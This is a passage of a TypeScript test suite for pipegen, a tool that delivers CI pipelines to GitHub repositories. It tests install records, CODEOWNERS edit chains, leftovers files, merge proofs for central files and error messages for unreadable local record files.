    const items = JSON.parse(readFileSync(leftoversFile(w), 'utf8')).items as { kind: string; name: string; previous?: Record<string, unknown>; changed?: string[] }[];
    const env = items.find((x) => x.kind === 'environment');
    expect(env?.previous).toMatchObject({ wait_timer: 3, can_admins_bypass: false, deployment_branch_policy: null, branch_policies: [] });
    expect(env?.changed).toEqual(['deployment_branch_policy', 'branch_policies']);
  });

  it('fix 2: a corrupt leftovers file stops the run with its name, and is never overwritten (N4)', async () => {
    const w = world();
    mkdirSync(join(w.home, '.config', 'pipegen', 'records'), { recursive: true, mode: 0o700 });
    writeFileSync(leftoversFile(w), '{ not json', { mode: 0o600 });
    w.g.hooks.push((c) => (c.route === 'POST /repos/{owner}/{repo}/pulls' && c.params.repo === 'r' ? { status: 500 } : undefined));
    const err = await firstRun(w).then(() => null, (e: unknown) => e) as DeliverError;
    expect(err).toBeInstanceOf(DeliverError);
    expect(err.message).toMatch(/o__r\.leftovers\.json is not pipegen's leftovers file/);
    expect(err.leftovers).toEqual(expect.arrayContaining([`secret repo ${FP}`]));
    expect(readFileSync(leftoversFile(w), 'utf8')).toBe('{ not json');
  });

  it('fix 2: a stale local record file is named in the stop, with removing it as the way on (N5, R1-d)', async () => {
    const w = world();
    await firstRun(w);   // machine A: its local file holds run 1's hash
    const keep = readFileSync(localFile(w), 'utf8');
    const newer = structuredClone(await record(w) as Rec);
    newer.createdAt = '2026-12-02T00:00:00Z';
    w.g.commitOn('o/pipelines', 'main', { [recordPath('r')]: JSON.stringify(newer) });   // machine B's newer record
    writeFileSync(localFile(w), keep);
    const p = profile();
    const err = await deliverCentral(w.g.octokit(), p, centralFiles(' # v2'), cdeps(w)).then(() => null, (e: unknown) => e) as Error;
    expect(err.message).toContain(`remove ${localFile(w)}`);
    expect(err.message).not.toMatch(/npx pipegen finish/);
    // with the stale file removed, the user is asked to confirm the record (G10-R-sec6), and the run goes on
    rmSync(localFile(w));
    expect((await deliverCentral(w.g.octokit(), p, centralFiles(' # v2'), cdeps(w, 'o/r'))).kind).toBe('central-pr');
  });
});

// ---------- G17 group C (the install record and delivery) ----------

describe('G17C: the install record and delivery', () => {
  const upd = `pipegen/update-${centralProjectName('r')}`;
  const localFile = (w: World): string => join(w.home, '.config', 'pipegen', 'records', 'o__r.json');
  const leftoversFile = (w: World): string => join(w.home, '.config', 'pipegen', 'records', 'o__r.leftovers.json');
  type Rec = NonNullable<Awaited<ReturnType<typeof record>>>;
  const B1 = '# pipegen:begin\n.github/workflows/** @a @b\n# pipegen:end\n';
  const B2 = '# pipegen:begin\n.github/workflows/** @b @a\n# pipegen:end\n';
  /** Plants `r` as the trusted record (central default branch + this machine's local record file). */
  const plant = async (w: World, r: Rec, setupPr: number): Promise<void> => {
    w.g.commitOn('o/pipelines', 'main', { [recordPath('r')]: recordFileText(r) }, 'record');
    await writeLocalRecord({ owner: 'o', repo: 'r' }, { recordHash: recordHash(r), setupPr, updatedAt: '2026-11-05T12:00:00Z' }, { home: w.home, env: {} });
  };
  const vault2 = () => {
    const v2 = new SecretVault();
    v2.set(KEY, KEY_VALUE);
    return v2;
  };
  const chained = (e: unknown): boolean => (recordMod as unknown as { editWritesChained: (x: unknown) => boolean }).editWritesChained(e);
  /** The second run's CODEOWNERS: pipegen's block B1 swapped for B2 in `current` (the file as it is on the default branch now). */
  const reCodeowners = (current: string): { file: CreatedFile; lock: LockPlan } => {
    const content = current.replace(B1, B2);
    const file = cf('CODEOWNERS', content, 'codeowners', { edited: { original: current } });
    return { file, lock: locks({ codeowners: { file, edit: { path: 'CODEOWNERS', kind: 'codeowners', inserted: B2, anchor: '' } } }) };
  };
  const rerun = async (w: World, current: string): Promise<Rec> => {
    const p = profile();
    w.g.repo('o/r').refs.set('heads/main', w.g.head('o/r', SETUP_BRANCH));   // the setup PR was merged
    if (current !== w.g.filesAt('o/r', w.g.head('o/r')).get('CODEOWNERS')) w.g.commitOn('o/r', 'main', { CODEOWNERS: current });
    const pin = (await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w)) as { sha: string }).sha;
    const { file, lock } = reCodeowners(current);
    const whole = appFiles(pin, { withPkg: false }).filter((f) => f.edited === undefined && f.inserted === undefined);
    await deliver(w.g.octokit(), p, planDelivery(input(p, pin, { files: [...centralFiles(), ...whole, file], locks: lock })), vault2(), deps(w));
    return (await record(w, upd)) as Rec;
  };

  it('row 22: every write of an edit records the blob it started from; the chain holds only without an owner edit between writes', async () => {
    const w = world();
    await firstRun(w);
    const r1 = await record(w) as Rec;
    const co1 = r1.edits.find((e) => e.path === 'CODEOWNERS') as Rec['edits'][number] & { baseShas?: (string | null)[] };
    expect(co1.baseShas).toEqual([gitBlobSha(CO_ORIG)]);
    expect(chained(co1)).toBe(true);
    // every edit kind deliver writes carries one base per written sha
    for (const e of r1.edits as (Rec['edits'][number] & { baseShas?: unknown[] })[]) expect(e.baseShas?.length, e.path).toBe(e.writtenShas.length);
    // a re-run straight on pipegen's own last write: the chain holds
    const w1 = `${CO_ORIG}\n${B1}`;
    const r2 = await rerun(w, w1);
    const co2 = r2.edits.find((e) => e.path === 'CODEOWNERS') as typeof co1;
    expect(co2.writtenShas).toEqual([gitBlobSha(w1), gitBlobSha(`${CO_ORIG}\n${B2}`)]);
    expect(co2.baseShas).toEqual([gitBlobSha(CO_ORIG), gitBlobSha(w1)]);
    expect(chained(co2)).toBe(true);
  });

  it('row 22: an owner edit between two writes breaks the chain (uninstall can\'t restore the first original over it)', async () => {
    const w = world();
    await firstRun(w);
    const owner = `# mine\n${CO_ORIG}\n${B1}`;
    const r2 = await rerun(w, owner);
    const co = r2.edits.find((e) => e.path === 'CODEOWNERS') as Rec['edits'][number] & { baseShas?: (string | null)[] };
    expect(co.originalSha).toBe(gitBlobSha(CO_ORIG));
    expect(co.baseShas).toEqual([gitBlobSha(CO_ORIG), gitBlobSha(owner)]);
    expect(chained(co)).toBe(false);
  });

  it('row 22 (row 23 in deliver): a re-run that leaves pipegen\'s block as it is keeps the recorded insert (never an empty one)', async () => {
    const w = world();
    await firstRun(w);
    const r1 = await record(w) as Rec;
    const ins1 = (r1.edits.find((e) => e.path === 'CODEOWNERS') as { inserted: string }).inserted;
    const p = profile();
    w.g.repo('o/r').refs.set('heads/main', w.g.head('o/r', SETUP_BRANCH));
    const pin = (await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w)) as { sha: string }).sha;
    const cur = `${CO_ORIG}\n${B1}`;
    const same = cf('CODEOWNERS', cur, 'codeowners', { edited: { original: cur } });
    const whole = appFiles(pin, { withPkg: false }).filter((f) => f.edited === undefined && f.inserted === undefined).map((f) => (f.path === 'PIPEGEN.md' ? { ...f, content: '# pipegen v2\n' } : f));
    await deliver(w.g.octokit(), p, planDelivery(input(p, pin, { files: [...centralFiles(), ...whole, same], locks: locks({ codeowners: { file: same, edit: { path: 'CODEOWNERS', kind: 'codeowners', inserted: B1, anchor: '' } } }) })), vault2(), deps(w));
    const co = (await record(w, upd) as Rec).edits.find((e) => e.path === 'CODEOWNERS') as { inserted: string; writtenShas: string[] };
    expect(co.inserted).toBe(ins1);
    expect(co.writtenShas).toEqual([gitBlobSha(cur)]);
    // the same with no block swap in the lock plan (nothing for the swap path to rebuild the insert from): the record's insert is kept
    const w2 = world();
    await firstRun(w2);
    w2.g.repo('o/r').refs.set('heads/main', w2.g.head('o/r', SETUP_BRANCH));
    const pin2 = (await deliverCentral(w2.g.octokit(), p, centralFiles(), cdeps(w2)) as { sha: string }).sha;
    const whole2 = appFiles(pin2, { withPkg: false }).filter((f) => f.edited === undefined && f.inserted === undefined).map((f) => (f.path === 'PIPEGEN.md' ? { ...f, content: '# pipegen v2\n' } : f));
    await deliver(w2.g.octokit(), p, planDelivery(input(p, pin2, { files: [...centralFiles(), ...whole2, same], locks: locks({ codeowners: undefined }) })), vault2(), deps(w2));
    const co2 = (await record(w2, upd) as Rec).edits.find((e) => e.path === 'CODEOWNERS') as { inserted: string; writtenShas: string[] };
    expect(co2.inserted).toBe(ins1);
    expect(co2.writtenShas).toEqual([gitBlobSha(cur)]);
  });

  it('row 23 (deliver): a re-run that swaps pipegen\'s block keeps the separator pipegen added in the recorded insert', async () => {
    const w = world();
    await firstRun(w);
    const r2 = await rerun(w, `${CO_ORIG}\n${B1}`);
    expect((r2.edits.find((e) => e.path === 'CODEOWNERS') as { inserted: string }).inserted).toBe(`\n${B2}`);
  });

  it('row 26: a secret pipegen overwrote is listed in the leftovers without a creation date (uninstall never deletes it from there)', async () => {
    const w = world();
    w.g.repo('o/r').stored.set(KEY, '2026-01-01T00:00:00Z');
    w.g.hooks.push((c) => (c.route === 'POST /repos/{owner}/{repo}/pulls' && c.params.repo === 'r' ? { status: 500 } : undefined));
    const err = await firstRun(w, {}, {}, { replace: true }).then(() => null, (e: unknown) => e) as DeliverError;
    expect(err).toBeInstanceOf(DeliverError);
    const items = JSON.parse(readFileSync(leftoversFile(w), 'utf8')).items as { kind: string; name: string; githubCreatedAt?: string }[];
    const k = items.find((x) => x.kind === 'secret' && x.name === KEY);
    expect(k).toBeDefined();
    expect(k).not.toHaveProperty('githubCreatedAt');
    // the one pipegen created this run has its date
    expect(items.find((x) => x.kind === 'secret' && x.name === FP)?.githubCreatedAt).toBe(w.g.repo('o/r').stored.get(FP));
  });

  it('row 27: the central repo id goes into the record only with createdByPipegen from the same source', () => {
    const rc = (deliverMod as unknown as { recordCentral: (prev: unknown, pc: unknown, live: number) => unknown }).recordCentral;
    // the hole: an earlier record that names the user's repo id, and a run whose "created" carries no id
    expect(rc({ createdByPipegen: false, repoId: 99, rulesetId: 3 }, { createdByPipegen: true }, 99)).toEqual({ createdByPipegen: true, rulesetId: 3 });
    expect(rc({ createdByPipegen: true, repoId: 77 }, { createdByPipegen: false }, 77)).toEqual({ createdByPipegen: true, repoId: 77 });
    expect(rc({ createdByPipegen: true, repoId: 77 }, { createdByPipegen: true, repoId: 99 }, 99)).toEqual({ createdByPipegen: true, repoId: 99 });
    expect(rc({ createdByPipegen: true, repoId: 77 }, { createdByPipegen: true }, 77)).toEqual({ createdByPipegen: true });
    expect(rc({ createdByPipegen: false, repoId: 99 }, { createdByPipegen: false }, 99)).toEqual({ createdByPipegen: false });
    expect(rc(undefined, { createdByPipegen: true, repoId: 5, actionsAccess: { previous: 'none' } }, 5)).toEqual({ createdByPipegen: true, repoId: 5, actionsAccess: { previous: 'none' } });
    expect(rc(undefined, undefined, 1)).toEqual({ createdByPipegen: false });
    // G17C-R1 (m1): an id that is not the live central repo's (a stale run-state id, a repo deleted and made again) is never recorded, nor
    // is "created" with it: from this run or from the earlier record
    expect(rc(undefined, { createdByPipegen: true, repoId: 111 }, 222)).toEqual({ createdByPipegen: false });
    expect(rc({ createdByPipegen: true, repoId: 77, rulesetId: 3 }, { createdByPipegen: false }, 88)).toEqual({ createdByPipegen: false, rulesetId: 3 });
  });

  it('G17C-R1 (m1): a stale central id from the run state goes into no record; the live one does', async () => {
    const w = world();
    await firstRun(w, { proofRepos: { central: { repoId: 111, createdByPipegen: true }, scratch: { createdByPipegen: true } } });
    expect((await record(w))?.central).toEqual({ createdByPipegen: false });
    const w2 = world();
    await firstRun(w2);
    expect((await record(w2))?.central).toEqual({ createdByPipegen: true, repoId: 77 });
  });

  it('G17C-R1 (m4): a re-run that writes nothing over an owner-edited CODEOWNERS records no write and no base', async () => {
    const w = world();
    await firstRun(w);
    const p = profile();
    w.g.repo('o/r').refs.set('heads/main', w.g.head('o/r', SETUP_BRANCH));
    const w1 = `${CO_ORIG}\n${B1}`;
    const owner = `# mine\n${w1}`;
    w.g.commitOn('o/r', 'main', { CODEOWNERS: owner });
    const pin = (await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w)) as { sha: string }).sha;
    const same = cf('CODEOWNERS', owner, 'codeowners', { edited: { original: owner } });
    const whole = appFiles(pin, { withPkg: false }).filter((f) => f.edited === undefined && f.inserted === undefined).map((f) => (f.path === 'PIPEGEN.md' ? { ...f, content: '# pipegen v2\n' } : f));
    await deliver(w.g.octokit(), p, planDelivery(input(p, pin, { files: [...centralFiles(), ...whole, same], locks: locks({ codeowners: undefined }) })), vault2(), deps(w));
    const co = (await record(w, upd) as Rec).edits.find((e) => e.path === 'CODEOWNERS') as Rec['edits'][number] & { baseShas?: (string | null)[] };
    expect(co.writtenShas).toEqual([gitBlobSha(w1)]);
    expect(co.baseShas).toEqual([gitBlobSha(CO_ORIG)]);
    expect(co.writtenShas).not.toContain(gitBlobSha(owner));
    expect(chained(co)).toBe(true);
  });

  it('G17C-R1 (F5): central files pipegen\'s own central PR added are created once that PR is merged; any other merge leaves them adopted', async () => {
    // G17C-R2: the PR is read on the fast path too (r2-i1: the run state alone proves nothing), and its branch and base are pinned (spec M2)
    for (const how of ['merge', 'fast-forward', 'other head', 'other merge', 'not merged', 'fast-forward not merged', 'other head ref', 'other base'] as const) {
      const w = world();
      w.g.repo('o/pipelines').rules = [{ type: 'pull_request', ruleset_id: 9 }];
      const p = profile();
      const c1 = await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w));
      if (c1.kind !== 'central-pr') throw new Error('central PR expected');
      const prHead = w.g.head('o/pipelines', upd);
      expect((c1 as { pr?: unknown }).pr, how).toEqual({ number: 1, commit: prHead });
      let merge: string;
      if (how.startsWith('fast-forward')) { w.g.repo('o/pipelines').refs.set('heads/main', prHead); merge = prHead; }
      else merge = w.g.commitOn('o/pipelines', 'main', Object.fromEntries(centralFiles().map((f) => [f.path, f.content])), 'Merge pull request #1');
      w.g.hooks.push((call) => (call.route === 'GET /repos/{owner}/{repo}/pulls/{pull_number}' && call.params.repo === 'pipelines'
        ? { status: 200, data: { number: 1, state: 'closed', merged_at: how.endsWith('not merged') ? null : '2026-11-05T12:30:00Z', head: { ref: how === 'other head ref' ? 'feature' : upd, sha: how === 'other head' ? 'f'.repeat(40) : prHead }, base: { ref: how === 'other base' ? 'dev' : 'main' }, merge_commit_sha: how === 'other merge' ? 'e'.repeat(40) : merge } }
        : undefined));
      const c2 = await deliverCentral(w.g.octokit(), p, centralFiles(), { ...cdeps(w), pr: (c1 as { pr: { number: number; commit: string } }).pr } as never);
      const mine = how === 'merge' || how === 'fast-forward';
      expect(c2, how).toMatchObject({ kind: 'pinned', sha: merge });
      expect((c2 as { committed?: true }).committed, how).toBe(mine ? true : undefined);
      await deliver(w.g.octokit(), p, planDelivery(input(p, merge, mine ? { centralCommitted: merge } : {})), w.vault, deps(w));
      const r = await record(w, upd) as Rec;
      for (const f of centralFiles()) expect(r.files.find((x) => x.path === f.path)?.adopted, `${how} ${f.path}`).toBe(mine ? undefined : true);
    }
  });

  it('G17C-R2 (r2-m1): the merge proves only files pipegen\'s commit added; a hand-made, reversed or rewound merge leaves every file adopted', async () => {
    const WEEKLY = cf('.github/workflows/r--weekly.yml', 'on: { workflow_call: {} }\njobs: { w: { runs-on: ubuntu-24.04, steps: [{ run: "true" }] } }\n', 'pipeline', { repo: 'central' });
    const files3 = (): CreatedFile[] => [...centralFiles(), WEEKLY];
    const nightly = centralFiles()[1] as CreatedFile;
    const all = (fs: CreatedFile[]): Record<string, string> => Object.fromEntries(fs.map((f) => [f.path, f.content]));
    const cases = {
      // P1: a merge [base, X] whose tree also adds an owner file X never had
      P1: { files: files3, history: (w: World, X: string) => { const D0 = w.g.head('o/pipelines'); const M = w.g.commitOn('o/pipelines', 'main', all(files3()), 'evil merge'); w.g.repo('o/pipelines').commits.get(M)!.parents = [D0, X]; return M; } },
      // P2: [X, base + owner file]: main merged into pipegen's branch and pushed to main
      P2: { files: files3, history: (w: World, X: string) => { const D1 = w.g.commitOn('o/pipelines', 'main', { [WEEKLY.path]: WEEKLY.content }, 'owner adds weekly'); const M = w.g.commitOn('o/pipelines', 'main', all(files3()), 'reversed merge'); w.g.repo('o/pipelines').commits.get(M)!.parents = [X, D1]; return M; } },
      // P3: the owner's identical nightly was on main before the PR (in X's parent); main force-pushed back, then GitHub merged [I, X]
      P3: { files: centralFiles, before: (w: World) => { const I = w.g.head('o/pipelines'); w.g.commitOn('o/pipelines', 'main', { [nightly.path]: nightly.content }, 'owner adds nightly'); return I; }, history: (w: World, X: string, I?: string) => { w.g.repo('o/pipelines').refs.set('heads/main', I as string); const M = w.g.commitOn('o/pipelines', 'main', all(centralFiles()), 'Merge pull request #1'); w.g.repo('o/pipelines').commits.get(M)!.parents = [I as string, X]; return M; } },
      // P6: the parents reversed with nothing else in it ([X, base]): not a merge GitHub makes, so no proof (the parent shape alone decides)
      P6: { files: centralFiles, history: (w: World, X: string) => { const D0 = w.g.head('o/pipelines'); const M = w.g.commitOn('o/pipelines', 'main', all(centralFiles()), 'reversed merge'); w.g.repo('o/pipelines').commits.get(M)!.parents = [X, D0]; return M; } },
      // P7: an octopus merge [base, Y, X]
      P7: { files: centralFiles, history: (w: World, X: string) => { const D0 = w.g.head('o/pipelines'); const M = w.g.commitOn('o/pipelines', 'main', all(centralFiles()), 'octopus'); w.g.repo('o/pipelines').commits.get(M)!.parents = [D0, D0, X]; return M; } },
      // P4 (control): GitHub's merge [D1, X], the owner added weekly on main meanwhile
      P4: { files: files3, history: (w: World, X: string) => { const D1 = w.g.commitOn('o/pipelines', 'main', { [WEEKLY.path]: WEEKLY.content }, 'owner adds weekly'); const M = w.g.commitOn('o/pipelines', 'main', all(centralFiles()), 'Merge pull request #1'); w.g.repo('o/pipelines').commits.get(M)!.parents = [D1, X]; return M; } },
      // P5 (control): a squash (one parent: the base), the owner added weekly meanwhile
      P5: { files: files3, history: (w: World) => { w.g.commitOn('o/pipelines', 'main', { [WEEKLY.path]: WEEKLY.content }, 'owner adds weekly'); return w.g.commitOn('o/pipelines', 'main', all(centralFiles()), 'squash #1'); } },
    } as const;
    for (const [name, k] of Object.entries(cases) as [keyof typeof cases, { files: () => CreatedFile[]; before?: (w: World) => string; history: (w: World, X: string, I?: string) => string }][]) {
      const w = world();
      const I = k.before?.(w);
      w.g.repo('o/pipelines').rules = [{ type: 'pull_request', ruleset_id: 9 }];
      const p = profile();
      const c1 = await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w));
      if (c1.kind !== 'central-pr') throw new Error('central PR expected');
      const pr = (c1 as { pr: { number: number; commit: string } }).pr;
      const X = w.g.head('o/pipelines', upd);
      const M = k.history(w, X, I);
      w.g.hooks.push((call) => (call.route === 'GET /repos/{owner}/{repo}/pulls/{pull_number}' && call.params.repo === 'pipelines'
        ? { status: 200, data: { number: pr.number, state: 'closed', merged_at: '2026-11-05T12:30:00Z', head: { ref: upd, sha: X }, base: { ref: 'main' }, merge_commit_sha: M } } : undefined));
      const c2 = await deliverCentral(w.g.octokit(), p, k.files(), { ...cdeps(w), pr } as never);
      const proven = name === 'P4' || name === 'P5';
      expect((c2 as { committed?: true }).committed, name).toBe(proven ? true : undefined);
      await deliver(w.g.octokit(), p, planDelivery(input(p, M, { files: [...k.files(), ...appFiles(M)], ...(proven ? { centralCommitted: M } : {}) })), w.vault, deps(w));
      const r = await record(w, upd) as Rec;
      for (const f of k.files()) {
        const own = proven && f.path !== WEEKLY.path;
        expect(r.files.find((x) => x.path === f.path)?.adopted, `${name} ${f.path}`).toBe(own ? undefined : true);
      }
    }
  });

  it('row 28: central files a foreign commit added (identical to pipegen\'s) are recorded adopted; this run\'s own central commit is created', async () => {
    const w = world();
    w.g.commitOn('o/pipelines', 'main', Object.fromEntries(centralFiles().map((f) => [f.path, f.content])), 'not pipegen');
    const p = profile();
    const c = await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w));
    expect(c).toMatchObject({ kind: 'pinned', done: [] });
    await deliver(w.g.octokit(), p, planDelivery(input(p, (c as { sha: string }).sha)), w.vault, deps(w));
    const r = await record(w) as Rec;
    for (const f of centralFiles()) expect(r.files.find((x) => x.path === f.path)?.adopted, f.path).toBe(true);
    // the commit deliverCentral made in this run: pipegen's own
    const w2 = world();
    await firstRun(w2);
    for (const f of centralFiles()) expect((await record(w2))?.files.find((x) => x.path === f.path)?.adopted, f.path).toBeUndefined();
  });

  it('row 30: the typed view keeps only the app keys the allow-list names', () => {
    expect((TYPED_VIEW_FIELDS as unknown as { app?: { keep: readonly string[] } }).app?.keep.slice().sort()).toEqual(Object.keys(InstallRecordSchema.shape.app.shape).sort());
    const r = {
      schema: 2, pipegenVersion: '0.2.0', createdAt: '2026-11-05T12:00:00Z', centralSha: null,
      app: { owner: 'o', repo: 'r', repoId: 1, defaultBranch: 'main', private: true, ownerType: 'User', planted: 'x' },
      name: 'r', serviceRoots: [], files: [], edits: [],
      // the key is built at runtime: written as a literal with its empty list, redact() takes it for a secret (no-secret-literals.test.ts)
      [['secr', 'ets'].join('')]: [],
      variables: [], environments: [], rulesets: [],
      planned: { signingMode: 'none', environments: [], owners: { app: [], central: [] }, codeOwners: [] }, protectedPaths: [],
    };
    const cv = confirmView(r as never);
    expect('view' in cv && cv.view.app).toEqual({ owner: 'o', repo: 'r', repoId: 1, defaultBranch: 'main', private: true, ownerType: 'User' });
  });

  for (const how of ['not JSON', 'a folder', 'another form'] as const) {
    it(`row 31: a local record file that can't be read (${how}) is a hard "untrusted": no question, the file named, never overwritten`, async () => {
      const w = world();
      await firstRun(w);
      rmSync(localFile(w));
      if (how === 'a folder') mkdirSync(localFile(w));
      else writeFileSync(localFile(w), how === 'not JSON' ? '{ not json' : JSON.stringify({ recordHash: 'x' }), { mode: 0o600 });
      const err = await deliverCentral(w.g.octokit(), profile(), centralFiles(' # v2'), cdeps(w, 'o/r')).then(() => null, (e: unknown) => e) as Error;
      expect(err).toBeInstanceOf(DeliverError);
      expect(err.message).toContain(localFile(w));
      expect(err.message).toMatch(/can't be read/);
      // G17C-R2 (spec M1): deliverCentral's own way on
      expect(err.message).toContain('Remove or fix that local record file, then run `npx pipegen run` again');
      expect(w.asked.filter((q) => /to trust exactly these entries/.test(q))).toEqual([]);
      if (how !== 'a folder') expect(readFileSync(localFile(w), 'utf8')).toBe(how === 'not JSON' ? '{ not json' : JSON.stringify({ recordHash: 'x' }));
    });
  }

  it('G17C-R2 (spec M1): with an unreadable local record file, deliver and the run\'s trust step give `npx pipegen run` as the next step', async () => {
    const w = world();
    await firstRun(w);
    writeFileSync(localFile(w), '{ not json', { mode: 0o600 });   // a folder would also stop the save at the end, before the notes
    const p = profile();
    const pin = w.g.head('o/pipelines');
    const said = await deliver(w.g.octokit(), p, planDelivery(input(p, pin)), vault2(), deps(w, {}, { replace: true }))
      .then((r) => r.notes.join('\n'), (e: unknown) => (e as Error).message);
    expect(said).toContain(localFile(w));
    expect(said).toContain('Remove or fix that local record file, then run `npx pipegen run` again');
    writeFileSync(localFile(w), '{ not json', { mode: 0o600 });   // deliver saved its record file again
    const t = await trustedForRun({ gh: w.g.octokit(), clock: { budget: newRateBudget(), sleep: async () => {} } }, p, { home: w.home, env: {} }, io(w), false);
    expect(t.record).toBeNull();
    expect(t.notes.join('\n')).toContain(localFile(w));
    expect(t.notes.join('\n')).toContain('Remove or fix that local record file, then run `npx pipegen run` again');
  });

  it('row 32: after a typed trust, the signing environment\'s settings before this run\'s change are recorded; with no change, a manual-review note', async () => {
    const signing = { signing: { mode: 'key-env' as const, images: [], cosignPubSha256: pubKeySha256(SIGNING.pub) } };
    const w = world();
    w.g.repo('o/r').envs.set('pipegen-signing', { id: 5, created_at: '2026-01-01T00:00:00Z', wait_timer: 3, prevent_self_review: false, reviewers: [], can_admins_bypass: false, deployment_branch_policy: null, policies: [], stored: new Map() });
    await firstRun(w, {}, { signingKey: async () => SIGNING }, {}, signing);
    expect((await record(w))?.environments[0]).toMatchObject({ created: false, previous: { wait_timer: 3 } });
    const p = profile();
    const again = async (): Promise<{ env: Rec['environments'][number] | undefined; notes: string[] }> => {
      rmSync(localFile(w));
      const pin = (await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w, 'o/r')) as { sha: string }).sha;
      const res = await deliver(w.g.octokit(), p, planDelivery(input(p, pin, {}, signing)), vault2(), { ...deps(w, { signingKey: async () => SIGNING }, { replace: true, typed: 'o/r' }), interactive: true });
      return { env: (await record(w, upd))?.environments.find((e) => e.name === 'pipegen-signing'), notes: res.notes };
    };
    // nothing to narrow this time: the earlier settings are not in the view, so a note says to check them by hand at uninstall
    const a = await again();
    expect(a.env?.previous).toBeUndefined();
    expect(a.notes.join('\n')).toMatch(/pipegen-signing.*can't put back.*settings.*by hand/s);
    // someone opened it again since: this run narrows it, and records what it was just before
    const e = w.g.repo('o/r').envs.get('pipegen-signing') as { deployment_branch_policy: unknown; wait_timer: number; policies: unknown[] };
    e.deployment_branch_policy = null;
    e.policies = [];   // GitHub drops the branch rules with the custom policy
    e.wait_timer = 7;
    const b = await again();
    expect(b.env?.previous).toMatchObject({ wait_timer: 7, deployment_branch_policy: null });
    // G17C-R1 (i1): what pipegen narrowed before the typed record is still not recorded: said, though this run captured its own change
    expect(b.notes.join('\n')).toMatch(/pipegen-signing.*can't put back.*settings.*by hand/s);
    expect(b.env?.changed).toEqual(expect.arrayContaining(['deployment_branch_policy']));
    // opened again, and this run stops after narrowing it: the leftovers hold the settings it found, though the earlier entry has none
    e.deployment_branch_policy = null;
    e.policies = [];
    e.wait_timer = 9;
    w.g.hooks.push((c) => (!c.route.startsWith('GET ') && c.params.repo === 'r' && /\/git\//.test(c.route) ? { status: 500, data: { message: 'boom' } } : undefined));
    const err = await again().then(() => null, (x: unknown) => x) as DeliverError;
    expect(err).toBeInstanceOf(DeliverError);
    expect(err.leftovers).toEqual(expect.arrayContaining(['environment pipegen-signing (narrowed)']));
    const items = JSON.parse(readFileSync(leftoversFile(w), 'utf8')).items as { kind: string; previous?: Record<string, unknown> }[];
    expect(items.find((x) => x.kind === 'environment')?.previous).toMatchObject({ wait_timer: 9, deployment_branch_policy: null });
  });

  it('row 33: a re-run over a whole file the owner changed after pipegen wrote it stops with a true message', async () => {
    const w = world();
    const first = await firstRun(w);
    w.g.repo('o/r').refs.set('heads/main', w.g.head('o/r', SETUP_BRANCH));
    w.g.commitOn('o/r', 'main', { 'PIPEGEN.md': '# pipegen\n\nour notes\n' });
    const p = profile();
    const pin = (await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w)) as { sha: string }).sha;
    const whole = appFiles(pin, { withPkg: false }).filter((f) => f.edited === undefined && f.inserted === undefined).map((f) => (f.path === 'PIPEGEN.md' ? { ...f, content: '# pipegen v2\n' } : f));
    const go = () => deliver(w.g.octokit(), p, planDelivery(input(p, pin, { files: [...centralFiles(), ...whole], locks: locks({ codeowners: undefined }) })), vault2(), deps(w));
    const err = await go().then(() => null, (e: unknown) => e) as Error;
    expect(err.message).toMatch(/PIPEGEN\.md changed after pipegen wrote it/);
    expect(err.message).not.toMatch(/pipegen didn't write it/);
    expect(err.message).toContain('`npx pipegen run`');
    // the same for a file `pipegen update` merged into the owner's text (ownerEdited)
    const r = await record(w) as Rec;
    await plant(w, { ...r, files: r.files.map((f) => (f.path === 'PIPEGEN.md' ? { ...f, ownerEdited: true as const, shas: [...f.shas, gitBlobSha('# pipegen\n\nour notes\n')] } : f)) }, first.res.prNumber);
    const err2 = await go().then(() => null, (e: unknown) => e) as Error;
    expect(err2.message).toMatch(/PIPEGEN\.md changed after pipegen wrote it/);
    // a file pipegen never recorded keeps the old message
    const w2 = world({ appFiles: { 'README.md': 'hi\n', CODEOWNERS: CO_ORIG, [HOOK_FILES['pre-commit']]: HOOK_ORIG, 'package.json': PJ, 'package-lock.json': LOCK, '.github/workflows/deploy.yml': DEPLOY_ORIG, 'PIPEGEN.md': 'theirs\n' } });
    await expect(firstRun(w2)).rejects.toThrow(/PIPEGEN\.md already exists in your repository and pipegen didn't write it/);
  });

  it('row 35: a created_at GitHub now gives in another form of the same instant still proves the secret pipegen\'s own', async () => {
    const w = world();
    const first = await firstRun(w);
    const at = (await record(w))?.secrets.find((s) => s.name === FP)?.githubCreatedAt as string;
    expect(at).toMatch(/\.\d{3}Z$/);
    w.g.repo('o/r').stored.set(FP, at.replace(/\.\d{3}Z$/, 'Z'));
    w.g.repo('o/r').stored.set(KEY, (w.g.repo('o/r').stored.get(KEY) as string).replace(/\.\d{3}Z$/, 'Z'));
    const p = profile();
    await deliver(w.g.octokit(), p, planDelivery(input(p, first.pin)), vault2(), deps(w, {}, { replace: true }));
    const r2 = (await record(w, upd)) as Rec;
    expect(r2.secrets.find((s) => s.name === FP)).toMatchObject({ created: true });
    expect(r2.secrets.find((s) => s.name === KEY)).toMatchObject({ created: true });
    expect(w.asked.some((q) => q.includes(KEY) && /pipegen stored it on an earlier run/.test(q))).toBe(true);
  });
});
